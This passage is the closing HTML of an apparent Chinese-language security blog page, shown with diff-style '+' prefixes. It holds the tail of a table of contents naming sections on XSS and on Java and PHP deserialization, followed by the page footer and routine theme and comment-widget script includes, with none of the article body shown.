href="#XSS危害"><span class="nav-number">4.1.</span> <span class="nav-text">XSS危害</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS构造技巧"><span class="nav-number">4.2.</span> <span class="nav-text">XSS构造技巧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS防御"><span class="nav-number">4.3.</span> <span class="nav-text">XSS防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器解码"><span class="nav-number">4.4.</span> <span class="nav-text">浏览器解码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#富文本XSS防御"><span class="nav-number">4.5.</span> <span class="nav-text">富文本XSS防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java反序列化"><span class="nav-number">5.</span> <span class="nav-text">Java反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#POP利用链"><span class="nav-number">5.1.</span> <span class="nav-text">POP利用链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP反序列化"><span class="nav-number">6.</span> <span class="nav-text">PHP反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP反序列化对象注入"><span class="nav-number">6.0.0.1.</span> <span class="nav-text">PHP反序列化对象注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Session反序列化对象"><span class="nav-number">6.0.0.2.</span> <span class="nav-text">Session反序列化对象</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#漏洞挖掘-1"><span class="nav-number">6.0.0.3.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m3lon</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
